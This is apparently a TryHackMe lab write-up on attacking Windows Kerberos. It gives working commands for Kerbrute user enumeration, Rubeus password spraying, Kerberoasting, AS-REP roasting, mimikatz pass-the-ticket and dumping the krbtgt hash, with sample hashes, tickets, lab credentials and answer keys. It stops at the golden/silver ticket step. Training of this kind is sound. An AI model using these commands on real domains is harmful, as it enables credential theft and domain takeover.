---
title: Attacking Kerberos
date: 2025-04-26 00:00:00 +/-TTTT
categories:
  - Practice
  - Tryhackme - Active Directory
tags:
  - kerbrute
  - rubeus
  - hashcat
  - asreproasting
  - kerberoasting
  - getuserspns
  - mimikatz
  - pass-the-ticket
  - silver-ticket
  - golden-ticket
  - skeleton-key
image: preview-image.png
media_subpath: /assets/img/Practice/Tryhackme - Active Directory/2025-05-31-attacking-kerberos/
---

## Introduction 

This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we’ll cover the following:

* Initial enumeration using tools like Kerbrute and Rubeus
* Kerberoasting
* AS-REP Roasting with Rubeus and Impacket
* Golden/Silver Ticket Attacks
* Pass the Ticket
* Skeleton key attacks using mimikatz

This room will be related to very real-world applications and will most likely not help with any CTFs however it will give you great starting knowledge of how to escalate your privileges to a domain admin by attacking Kerberos and allow you to take over and control a network.

It is recommended to have knowledge of general post-exploitation, active directory basics, and windows command line to be successful with this room.

### What is Kerberos? 

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more “secure” than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

### Common Terminology

* **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
* **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
* **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
* **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
* **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
* **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
* **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
* **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
* **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
* **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user’s relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### AS-REQ w/ Pre-Authentication In Detail 

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

### Ticket Granting Ticket Contents 

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

![](2025-05-31-attacking-kerberos-2.png)

### Service Ticket Contents 

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they’re validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I’ll break it down into what each portion contains.

* Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
* User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

![](2025-05-31-attacking-kerberos-3.png)

### Kerberos Authentication Overview 

* AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
* AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
* TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
* TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
* AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
* AP-REP - 6.) The service grants access

### Kerberos Tickets Overview 

![](2025-05-31-attacking-kerberos-4.png)

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

### Attack Privilege Requirements 

* Kerbrute Enumeration - No domain access required
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Golden Ticket - Full domain compromise (domain admin) required
* Silver Ticket - Service hash required
* Skeleton Key - Full domain compromise (domain admin) required

To start this room deploy the machine and start the next section on enumeration w/ Kerbrute

This Machine can take up to 10 minutes to boot and up to 5 minutes to SSH or RDP into the machine

### **Questions**

* What does TGT stand for? Answer: `Ticket Granting Ticket`
* What does SPN stand for? Answer: `Service Principal Name`
* What does PAC stand for? Answer: `Privilege Attribute Certificate`
* What two services make up the KDC? Answer: `AS, TGS`

## Enumeration w/ Kerbrute 

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

For more information on enumeration using Kerbrute check out the Attacktive Directory room by Sq00ky - https://tryhackme.com/room/attacktivedirectory

You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - `MACHINE_IP CONTROLLER.local`

### Abusing Pre-Authentication Overview 

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

### Kerbrute Installation 

1. Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
2. Rename kerbrute\_linux\_amd64 to kerbrute
3. chmod +x kerbrute - make kerbrute executable

### Enumerating Users w/ Kerbrute 

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

1. cd into the directory that you put Kerbrute
2. Download the wordlist to enumerate with here
3. `./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt` - This will brute force user accounts from a domain controller using a supplied wordlist

Now enumerate on your own and find the rest of the users and more importantly service accounts.

```bash
kali@kali:~/CTFs/tryhackme/Attacking Kerberos$ sudo /opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/\|_\|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (1ad284a) - 11/24/20 - Ronnie Flathers @ropnop

2020/11/24 19:04:20 >  Using KDC(s):
2020/11/24 19:04:20 >   CONTROLLER.local:88

2020/11/24 19:04:20 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2020/11/24 19:04:20 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2020/11/24 19:04:20 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2020/11/24 19:04:21 >  Done! Tested 100 usernames (10 valid) in 0.406 seconds

```

### **Questions**

* How many total users do we enumerate? Answer: `10`
* What is the SQL service account name? Answer: `sqlservice`
* What is the second “machine” account name? Answer: `machine2`
* What is the third “user” account name? Answer: `user3`

## Harvesting & Brute-Forcing Tickets w/ Rubeus 

To start this task you will need to RDP or SSH into the machine your credentials are -

```bash
Username: Administrator 
Password: P@$$W0rd 
Domain: controller.local
```

Your Machine IP is 10.10.197.112

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I’ll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

Rubeus is already compiled and on the target machine.

### Harvesting Tickets w/ Rubeus 

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

1. `cd Downloads` - navigate to the directory Rubeus is in
2. `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds

* this will run in every 30 second time interval until we manually stop it.

### Brute-Forcing / Password-Spraying w/ Rubeus 

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and “spray” against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:

`echo 10.10.197.112 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

1. `cd Downloads` - navigate to the directory Rubeus is in
2. `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and “spray” it against all found users then give the .kirbi TGT for that user

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>echo 10.10.135.137 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7X5jDNej2iF5f1pJiq0CyaD/RNnxz3MLWVY0/KlZceZruw9O6eN4gptAKWdIbP1B8+FiBERdxF6R
      hSzgQLpd6buWMjZzY165bGBpGK9Dd3t989gboqKvD1wXon7I4CVFnaEW8TnSyUauPdMFYft8V+ilE7Kt
      M5C9PI9TSPJyaUkTOS0NZvqiNrWBuD4qq8rtQERSQADejaMfQibusIj4WkycUUxvMC4wXsAIMoEBD9YM
      Ta2ZJgBrbiZ98Gkg3nyHl4YQ0QK+wEYiN7T+/MPc6PLkijsMNsHVG41OmokxfKv3vXqmWdLqIScm7z2f
      5VB4q+MhrxL8RupeE5s2Q++mGtnuyyUHxaMHg7pwRsGuxAASAF6KfIGNMjoO82i7ui+1//8EEF7SstZX
      OOqh4wlSRdup5Xh8AxOj0u9Tzgw3ivIreqVP7VXtpRhwnvPrf3cENbNs4ENiCyIfVCWVXAnKYAnkf7gf
      WyTUEnODw0dP9MlHGglN6d8rrZWk9jEWISvInmgk+MrnXeALRwF8q134idvz3v2DxF5aULdM4HV02xIo
      VEY51+I4gxaTlEkuQsVPiJtcQeiuyX6OITsl4F6bkKd2OVIIQ1LdITDMJzuoIqbGM+kpuOEODBTctLRd
      7i6dsihQ+bZf6TWi6NJ4f/ZPDd9dTOOtjVaQvi3NlCjMBcZtsuRgC53ieiGq7/54P6ZqE5InZZK1mllM
      Gg2bryfL5uOyQu0mMfuXO7ZrhSqLoRiojF3KS/aTXOWT68GjmUQ+zLNmFcGjSz7gctroHxdz9SRiQezy
      KwnGMa8ijzvkrFuUiO0y2m7TicWigN795b30pmwBA38qN6DR5h9B1aiBoiSO8AuKRLnajMZXIfh95RUd
      78UCuOSF09MsDc5ipPlqoIpo3SvNzqGikeeIt4GSkV9Nfx5NbWXSvOoOz5slLtE0uivrrbmOzxydqkRE
      Y8215pLrqap/gUBuC7UcYszbUWQQpz4oRpzSrKhRECEar78AHaPEEoSNxNdbT991JJJF4IBbyQNLnKzG
      K5ZgQrsMNUW2hWDDVfhuFtAi4UwNoWyxWZDyeWnkq8/btVYx+XlaQsK0vO4TfIgCPPuXiEWWSWxQhQwO
      FN3NW5mzdvGMtPLS4qdzZuzx7FWTpLfQWFTMOKhbSuMDDYueVls/kexouBiZTB8zZ3+QQ+dmJUCwFUzu
      98CQyvuv5iDOzP5bsRxhSXlfvD6Dm+rIjL9jntbFwYyj588vpegMVaznikdmEJAumOHRrQgHBqBRhR5V
      al2bgh0y00Lo8zCjqy+c5CiQp+YFJi3+JeQIGKsqV2h4+cbhrxKIlnQqExawZJtpQKOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIKhyMZpMwU215u2/yya0NkPY1pJq3H9mhIzm
      fyqKZST1oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIxMDYyOTE1NDYxMVqmERgPMjAyMTA2MzAwMTQ2MTFapxEYDzIwMjEwNzA2MTU0NjExWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done

```

Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

### **Questions**

* Which domain admin do we get a ticket for when harvesting tickets? Answer: `Administrator`
* Which domain controller do we get a ticket for when harvesting tickets? Answer: `CONTROLLER-1`

## Kerberoasting w/ Rubeus & Impacket 

In this task we’ll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

In order to perform the attack, we’ll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I’ll leave you to do your own research on those tools.

I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.

### Kerberoasting w/ Rubeus (local) 

1. `cd Downloads` - navigate to the directory Rubeus is in
2. `Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users

copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

I have created a modified rockyou wordlist in order to speed up the process download it [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt)

1. `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash

### Impacket Installation - 

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

1.) cd /opt navigate to your preferred directory to save tools in

2.) download the precompiled package from [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket\_0\_9\_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)

3.) cd Impacket-0.9.19 navigate to the impacket directory

4.) pip install . - this will install all needed dependencies

### Kerberoasting w/ Impacket (remotely) 

1.) `cd /usr/share/doc/python3-impacket/examples/` - navigate to where GetUserSPNs.py is located

2.) `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.197.112 -request` - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) `hashcat -m 13100 -a 0 hash.txt Pass.txt` - now crack that hash

What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don’t want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

### Kerberoasting Mitigation

* Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
* Don’t Make Service Accounts Domain Admins - Service accounts don’t need to be domain admins, kerberoasting won’t be as effective if you don’t make service accounts domain admins.

### **Questions**

* What is the HTTPService Password? Answer: `Summer2020`
* What is the SQLService Password? Answer: `MYPassword123#`

## AS-REP Roasting w/ Rubeus 

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We’ll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we’ll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket’s GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.

I have already compiled and put Rubeus on the machine.

### AS-REP Roasting Overview 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

### Dumping KRBASREP5 Hashes w/ Rubeus (local)

1. `cd Downloads` – navigate to the directory Rubeus is in
2. `Rubeus.exe asreproast` – This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast

(_____ \      \| \|  
_____) )_   _\| \|__  _____ _   _  ___  
\|  __  /\| \| \| \|  _ \\| ___ \| \| \| \|/___)  
\| \|  \ \\| \|_\| \| \|_) ) ____\| \|_\| \|___ \|  
\|_\|   \|_\|____/\|____/\|_____)____/(___/

v1.5.0

[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path ‘LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local’ for AS-REP roastable users  
[*] SamAccountName         : Admin2  
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local  
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::b1a8:fc88:ce2d:965%5)  
[*] Building AS-REQ (w/o preauth) for: ‘CONTROLLER.local\Admin2’  
[+] AS-REQ w/o preauth successful!  
[*] AS-REP hash:

$krb5asrep$Admin2@CONTROLLER.local:D74666FC02C59A3D6224C97F4214433F$F2DC7E041BDD  
4BE66D11CEFF49EDB1BF011CCAF025458A2D5326CAA1EB1B26DEB7DDC246A5E8CBEBECAA8674EC43  
EFE5632ECC8EAF516DC6108C44A8E6305658C9A14998C173F3CC0A30BF2474DD7F067CF1EC33C859  
E2FBE4C9767DCFCF5DB8147AFA5F08CFEC5ECCF9FA9839D0C8C8475872951BDC28527567210F0FE0  
14B38CD1A4752E2ED8F442C92E28BA79CFCB0699AAEE8394071A53906BE09D02DA7F1214C279D845  
5EAA8045C16BBE40ACA508DA385B622A2A0F538A25911885269362B0DDF993F684FB850D77BEFFCA  
F992F247AF0B48B76928D9D3E99C8E5D315EA38A61C0C35D62581C2A166ED8D0504744CDCB20

[*] SamAccountName         : User3  
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local  
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::b1a8:fc88:ce2d:965%5)  
[*] Building AS-REQ (w/o preauth) for: ‘CONTROLLER.local\User3’  
[+] AS-REQ w/o preauth successful!  
[*] AS-REP hash:

$krb5asrep$User3@CONTROLLER.local:A82390E1187D686737BF6D6D0875ACE5$A889A1EB5F300  
A26BCD9B6024C52802099A99AEBCABEF375C369085B1A63784E9949704D7CCA8C429EB91A6CEAA53  
73FAB913D550D354F263FF470D1CF32ACBA7F06EF58DE9DC3886BCC00521E735DFB2031231D37A35  
D1DF5E3F5E2BAEB71AF93B05846A07FA84FAA1C454611F4220BB3C75B5AC9467B58C8BC5BC9CC58B  
E79CDF3031FB0509C2CE269EBDE76978001E4BE655F1E357D704FF999958848BAEE3DCBF05ADA5A0  
A0D8A1FA3D35410516E84900A8CC1B4DA386B9C87C561F2836DAEAB18544CB34D0573A19E8CF7AD6  
332FB8682930E2FB33DC66A52018BB29E0AC6C22C5A9BF899BF0F86B7AC2948C52B87BB228F

C:\Users\Administrator\Downloads>

```

### Crack those Hashes w/ hashcat 

1. Transfer the hash from the target machine over to your attacker machine and put the hash into a \*.txt file
2. Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User…… Use the same wordlist that you downloaded in task 4
3. `hashcat -m 18200 hash.txt Pass.txt` – crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200

### AS-REP Roasting Mitigations

* Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
* Don’t turn off Kerberos Pre-Authentication unless it’s necessary there’s almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

### **Questions**

* What hash type does AS-REP Roasting use? Answer: `Kerberos 5 AS-REP etype 23`
* Which User is vulnerable to AS-REP Rosating? Answer: `User3`
* What is the Users’s Password? Answer: `Password3`
* Which User is vulnerable to AS-REP Roasting? Answer: `C:\Users\Administrator\Downloads>Rubeus.exe asreproast`
* Which Admin is vulnerable to AS-REP Rosating? Answer: `Admin2`
* What is the Admin’s Password? Answer: `P@$$W0rd2`

## Pass the Ticket w/ mimikatz

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.

You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.

### Pass the Ticket Overview 

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin’s ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

### Prepare Mimikatz & Dump Tickets 

You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don’t have an elevated command prompt mimikatz will not work properly.

1. `cd Downloads` – navigate to the directory mimikatz is in
2. `mimikatz.exe` – run mimikatz
3. `privilege::debug` – Ensure this outputs `Prviliege ’20’ OK` if it does not that means you do not have the administrator privileges to properly run mimikatz
4. `sekurlsa::tickets /export` – this will export all of the .kirbi tickets into the directory that you are currently in. At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier.

When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red below.

### Pass the Ticket w/ Mimikatz 

Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

1.) `kerberos::ptt <ticket>` – run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket.

2.) `klist` – Here were just verifying that we successfully impersonated the ticket by listing our cached tickets. We will not be using mimikatz for the rest of the attack.

3.) You now have impersonated the ticket giving you the same rights as the TGT you’re impersonating. To verify this we can look at the admin share.

**Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you’re in so do not take this as a definitive guide of how to run this attack.**

### Pass the Ticket Mitigation 

Let’s talk blue team and how to mitigate these types of attacks.

* Don’t let your domain admins log onto anything except the domain controller – This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

## Golden/Silver Ticket Attacks w/ mimikatz 

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain’s SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain’s SQL server.

### KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

### Golden/Silver Ticket Attack Overview 

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account’s SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

### Dump the krbtgt hash 

1. `cd downloads && mimikatz.exe` – navigate to the directory mimikatz is in and run mimikatz
2. `privilege::debug` – ensure this outputs `privilege ’20’ ok`
3. `lsadump::lsa /inject /name:krbtgt` – This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

```bash
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
                                                               
RID  : 000001f6 (502)                                          
User : krbtgt                                                  
                                                               
 * Primary                                                     
    NTLM : 72cd714611b64cd4d5550cd2759db3f6                    
    LM   :                                                     
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6                  
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6                  
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6 
                                              
 * WDigest                                    
    01  d2e9aa3caa4509c3f11521c70539e4ad      
    02  c9a868fc195308b03d72daa4a5a4ee47      
    03  171e066e448391c934d0681986f09ff4      
    04  d2e9aa3caa4509c3f11521c70539e4ad      
    05  c9a868fc195308b03d72daa4a5a4ee47      
    06  41903264777c4392345816b7ecbf0885      
    07  d2e9aa3caa4509c3f11521c70539e4ad      
    08  9a01474aa116953e6db452bb5cd7dc49      
    09  a8e9a6a41c9a6bf658094206b51a4ead      
    10  8720ff9de506f647ad30f6967b8fe61e 
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2 
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223

```

### Create a Golden/Silver Ticket 

